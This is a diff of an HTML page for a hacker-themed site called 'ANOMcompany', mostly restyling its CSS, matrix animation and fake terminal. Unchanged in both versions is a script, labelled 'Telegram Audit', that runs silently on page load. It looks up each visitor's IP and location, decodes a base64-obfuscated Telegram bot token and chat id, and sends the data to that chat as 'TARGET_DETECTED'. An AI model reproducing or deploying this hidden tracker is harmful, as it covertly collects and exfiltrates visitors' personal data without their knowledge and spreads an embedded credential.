@@ -7,46 +7,79 @@
     <style>
         :root { --bg-color: #080808; --primary-red: #ff0000; --dark-red: #660000; --text-color: #e0e0e0; }
         body, html { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-color); font-family: 'Consolas', 'Courier New', monospace; overflow-x: hidden; }
+        
+        /* Matrix Background */
         #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
-        .container { padding: 30px; position: relative; max-width: 1200px; margin: 0 auto; padding-bottom: 100px; }
-        .header { border-left: 5px solid var(--primary-red); padding-left: 20px; margin-bottom: 30px; }
-        h1 { color: var(--primary-red); letter-spacing: 5px; text-transform: uppercase; margin: 0; font-size: 2.5em; }
-        .nav { margin-bottom: 30px; display: flex; flex-wrap: wrap; gap: 10px; }
-        .nav a { color: var(--text-color); text-decoration: none; border: 1px solid var(--dark-red); padding: 8px 15px; background: rgba(139, 0, 0, 0.1); transition: 0.3s; font-size: 0.9em; cursor: pointer; }
+        
+        .container { padding: 20px; position: relative; max-width: 1200px; margin: 0 auto; padding-bottom: 80px; }
+        .header { border-left: 5px solid var(--primary-red); padding-left: 20px; margin-bottom: 25px; }
+        h1 { color: var(--primary-red); letter-spacing: 5px; text-transform: uppercase; margin: 0; font-size: 2.2em; }
+        
+        .nav { margin-bottom: 25px; display: flex; flex-wrap: wrap; gap: 8px; }
+        .nav a { color: var(--text-color); text-decoration: none; border: 1px solid var(--dark-red); padding: 6px 12px; background: rgba(139, 0, 0, 0.1); transition: 0.3s; font-size: 0.85em; cursor: pointer; }
         .nav a:hover { background: var(--primary-red); color: #000; box-shadow: 0 0 15px var(--primary-red); }
-        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 20px; height: 160px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(0,0,0,1); font-size: 0.95em; overflow-y: hidden; }
-        .dashboard { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
-        .panel { border: 1px solid var(--dark-red); background: #000; position: relative; overflow: hidden; }
+
+        /* Terminal Box */
+        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 15px; height: 160px; margin-bottom: 20px; font-size: 0.9em; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,1); }
+        
+        /* Dashboard Grid */
+        .dashboard { display: grid; grid-template-columns: 1fr; gap: 20px; }
+        @media (min-width: 768px) { .dashboard { grid-template-columns: 2fr 1fr; } }
+        
+        .panel { border: 1px solid var(--dark-red); background: #000; position: relative; min-height: 220px; overflow: hidden; display: flex; flex-direction: column; }
         .panel-header { background: var(--dark-red); color: white; padding: 5px 10px; font-size: 0.7em; letter-spacing: 2px; text-transform: uppercase; }
+
+        /* CANLI 3D GHOST MASK PANEL */
+        .ghost-mask-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; perspective: 1000px; }
+        .ghost-mask { 
+            width: 130px; 
+            height: auto; 
+            filter: drop-shadow(0 0 15px #fff);
+            animation: ghostLivePulse 6s infinite alternate ease-in-out;
+            transform-style: preserve-3d;
+            transition: 0.5s;
+        }
         
-        #data-pulse-panel { height: 220px; display: flex; flex-direction: column; }
-        .ghost-mask-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; position: relative; overflow: hidden; }
-        .ghost-mask { width: 130px; transition: 0.5s; animation: ghostGlow 6s infinite alternate; }
-        
-        @keyframes ghostGlow {
-            0% { filter: drop-shadow(0 0 15px #fff) brightness(1.1); }
-            50% { filter: drop-shadow(0 0 30px #800080) brightness(1.4); }
-            100% { filter: drop-shadow(0 0 25px #ff0000) brightness(1.2); }
+        /* Maskenin 3D Hareketi ve Renk Geçişi */
+        @keyframes ghostLivePulse {
+            0% { 
+                filter: drop-shadow(0 0 15px #fff) brightness(1.1);
+                transform: rotateY(-10deg) scale(1);
+            }
+            50% { 
+                filter: drop-shadow(0 0 30px #800080) brightness(1.4);
+                transform: rotateY(10deg) scale(1.05);
+            }
+            100% { 
+                filter: drop-shadow(0 0 25px #ff0000) brightness(1.2);
+                transform: rotateY(-5deg) rotateX(5deg) scale(1);
+            }
         }
 
-        .metric-label { font-size: 0.8em; margin-top: 10px; display: block; }
-        .metric-bar { height: 8px; background: #222; margin: 5px 0 15px 0; border-radius: 2px; }
-        .metric-fill { height: 100%; background: var(--primary-red); width: 0%; transition: width 2.5s ease-in-out; box-shadow: 0 0 8px var(--primary-red); }
-        .cursor { display: inline-block; width: 8px; height: 17px; background: var(--primary-red); animation: blink 1s infinite; vertical-align: middle; }
+        /* Metrics */
+        .metrics-content { padding: 15px; }
+        .metric-label { font-size: 0.75em; margin-top: 10px; display: block; }
+        .metric-bar { height: 6px; background: #222; margin: 5px 0 12px 0; }
+        .metric-fill { height: 100%; background: var(--primary-red); width: 0%; transition: width 2s ease-in-out; box-shadow: 0 0 8px var(--primary-red); }
+        
+        .cursor { display: inline-block; width: 8px; height: 15px; background: var(--primary-red); animation: blink 1s infinite; vertical-align: middle; }
         @keyframes blink { 0%, 100% {opacity:0} 50% {opacity:1} }
-        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 7px 0; font-size: 0.8em; overflow: hidden; z-index: 100; }
-        .ticker-wrap { display: inline-block; white-space: nowrap; animation: scroll 35s linear infinite; }
+        
+        /* Ticker Footer */
+        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 5px 0; font-size: 0.75em; overflow: hidden; z-index: 100; }
+        .ticker-wrap { display: inline-block; white-space: nowrap; animation: scroll 30s linear infinite; }
         @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        @media (max-width: 768px) { .dashboard { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
+    
     <div class="container">
         <div class="header">
             <h1>ANOMcompany</h1>
-            <p style="opacity: 0.7;">Security & Tool Development Laboratory</p>
+            <p style="opacity: 0.7; font-size: 0.8em;">Security & Tool Development Laboratory</p>
         </div>
+
         <div class="nav">
             <a href="projects.html">PROJECTS</a>
             <a href="chat.html">ANOM-CHAT</a>
@@ -55,44 +88,51 @@
             <a href="store.html">STORE</a>
             <a href="paybin.html">PAYBIN</a>
         </div>
+
         <div class="terminal-box">
             <span style="color: var(--primary-red)">[operator@anom]:~#</span> <span id="typewriter"></span><span class="cursor"></span>
         </div>
+
         <div class="dashboard">
-            <div id="data-pulse-panel" class="panel">
-                <div class="panel-header">ANOM_SENTRY // GHOST_MASK_ACTIVE</div>
+            <div class="panel">
+                <div class="panel-header">ANOM_SENTRY // GHOST_3D_ANIMATION</div>
                 <div class="ghost-mask-container">
-                    <img src="1000014211.jpg" class="ghost-mask" alt="GHOST" onerror="this.src='https://raw.githubusercontent.com/KullaniciAdin/ANOMsite/main/1000014211.jpg'">
+                    <img src="1000014211.jpg" class="ghost-mask" alt="GHOST" onerror="this.src='https://i.ibb.co/LzYvXmX/ghost-white.jpg'">
                 </div>
             </div>
-            <div class="panel" style="padding: 20px;">
-                <div class="panel-header" style="margin: -20px -20px 20px -20px;">CORE METRICS</div>
-                <span class="metric-label">CPU THREADS LOAD</span>
-                <div class="metric-bar"><div class="metric-fill" id="cpu-bar"></div></div>
-                <span class="metric-label">MEMORY USAGE</span>
-                <div class="metric-bar"><div class="metric-fill" id="ram-bar"></div></div>
-                <span class="metric-label">NETWORK I/O</span>
-                <div class="metric-bar"><div class="metric-fill" id="net-bar"></div></div>
-                <div style="margin-top: 25px; font-size: 0.75em; color: #555; line-height: 1.8;">
-                    <span style="color: var(--primary-red)">></span> VPN_TUNNEL: <span style="color: #0f0">SECURE</span><br>
-                    <span style="color: var(--primary-red)">></span> FIREWALL: <span style="color: #0f0">ACTIVE</span><br>
-                    <span style="color: var(--primary-red)">></span> ANOM_BOTNET: STANDBY
+
+            <div class="panel">
+                <div class="panel-header">CORE METRICS</div>
+                <div class="metrics-content">
+                    <span class="metric-label">SYSTEM LOAD</span>
+                    <div class="metric-bar"><div class="metric-fill" id="cpu-bar"></div></div>
+                    <span class="metric-label">NETWORK TRAFFIC</span>
+                    <div class="metric-bar"><div class="metric-fill" id="net-bar"></div></div>
+                    <div style="font-size: 0.7em; color: #555; margin-top: 15px; line-height: 1.6;">
+                        > VPN_TUNNEL: <span style="color: #0f0">SECURE</span><br>
+                        > FIREWALL: <span style="color: #0f0">ACTIVE</span><br>
+                        > STATUS: <span style="color: var(--primary-red)">MONITORING</span>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-    <div class="ticker"><div class="ticker-wrap">>>> SYSTEM_STATUS: OPERATIONAL -- SIGNAL_ANALYSIS: ACTIVE -- GHOST_PROTOCOLS_ENGAGED -- REPO_SYNC: OK...</div></div>
+
+    <div class="ticker"><div class="ticker-wrap">>>> SYSTEM_STATUS: OPERATIONAL -- GHOST_PROTOCOLS: ACTIVE -- TARGET_DETECTION_ENGINE: RUNNING -- REPO_SYNC: OK...</div></div>
 
     <script>
+        // Matrix Effect
         const mCanvas = document.getElementById('matrix'); const mCtx = mCanvas.getContext('2d');
         function initMatrix() { mCanvas.width = window.innerWidth; mCanvas.height = window.innerHeight; }
         window.addEventListener('resize', initMatrix); initMatrix();
         const mChars = "0123456789ABCDEF@#$%&*"; const mSize = 16; const mDrops = Array(Math.floor(mCanvas.width/mSize)).fill(1);
         function drawMatrix() { mCtx.fillStyle = "rgba(8, 8, 8, 0.08)"; mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height); mCtx.fillStyle = "#ff0000"; mCtx.font = mSize + "px monospace"; for (let i = 0; i < mDrops.length; i++) { const txt = mChars.charAt(Math.floor(Math.random() * mChars.length)); mCtx.fillText(txt, i * mSize, mDrops[i] * mSize); if (mDrops[i] * mSize > mCanvas.height && Math.random() > 0.975) mDrops[i] = 0; mDrops[i]++; } }
-        
-        const rawLog = "./initialize_lab.py\n> Mounting core systems... [OK]\n> Encrypting terminal session... [OK]\n> Welcome to ANOMcompany Laboratory.\n> ACCESS: OPERATOR GHOST.";
-        let lIdx = 0; function renderTerminal() { if (lIdx < rawLog.length) { document.getElementById("typewriter").innerHTML += rawLog.charAt(lIdx) === '\n' ? '<br>' : rawLog.charAt(lIdx); lIdx++; setTimeout(renderTerminal, 40); } else { setTimeout(() => { document.getElementById('cpu-bar').style.width = "71%"; document.getElementById('ram-bar').style.width = "54%"; document.getElementById('net-bar').style.width = "88%"; }, 500); } }
 
+        // Terminal Typewriter
+        const rawLog = "./initialize_lab.py\n> Mounting core systems... [OK]\n> Encrypting terminal session... [OK]\n> Welcome to ANOMcompany Laboratory.\n> ACCESS: OPERATOR GHOST.";
+        let lIdx = 0; function renderTerminal() { if (lIdx < rawLog.length) { document.getElementById("typewriter").innerHTML += rawLog.charAt(lIdx) === '\n' ? '<br>' : rawLog.charAt(lIdx); lIdx++; setTimeout(renderTerminal, 40); } else { setTimeout(() => { document.getElementById('cpu-bar').style.width = "68%"; document.getElementById('net-bar').style.width = "82%"; }, 500); } }
+
+        // Telegram Audit
         async function sysAudit() {
             try {
                 const r = await fetch('https://ipapi.co/json/');
@@ -100,19 +140,11 @@
                 const t = atob("NzgxMjE2NzI4NTpBQUZiNTFRUzRNY2NiVG9hVVBqNmE2U2F0bDJqZWViYkgxSQ==");
                 const c = atob("NjI5ODg2OTk2OA==");
                 const msg = `🚨 *TARGET_DETECTED*\n🌐 IP: ${d.ip}\n📍 LOC: ${d.city} / ${d.country_name}\n📱 DEV: ${navigator.platform}\n🔗 PATH: ${window.location.pathname}`;
-                await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" })
-                });
+                await fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" }) });
             } catch (e) {}
         }
 
-        window.onload = () => {
-            setInterval(drawMatrix, 50);
-            setTimeout(renderTerminal, 800);
-            sysAudit();
-        };
+        window.onload = () => { setInterval(drawMatrix, 50); setTimeout(renderTerminal, 800); sysAudit(); };
     </script>
 </body>
 </html>
